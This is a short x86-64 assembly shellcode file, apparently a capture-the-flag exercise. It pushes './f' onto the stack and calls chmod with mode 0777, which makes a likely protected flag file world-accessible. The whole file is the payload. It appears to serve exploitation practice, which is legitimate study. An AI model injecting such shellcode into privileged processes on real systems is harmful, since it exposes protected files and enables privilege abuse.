.intel_syntax noprefix
.globl _start

_start:
    mov ebx, 0x662f2e
    push rbx
    mov al, 90              # SYS_chmod
    mov rdi, rsp            # address of ./f
    #lea rdi, [rip+flag]     # address of ./f
    mov si, 511             # Mode
    syscall                 # chmod("./f", 0777)
flag:
    .string "./f"

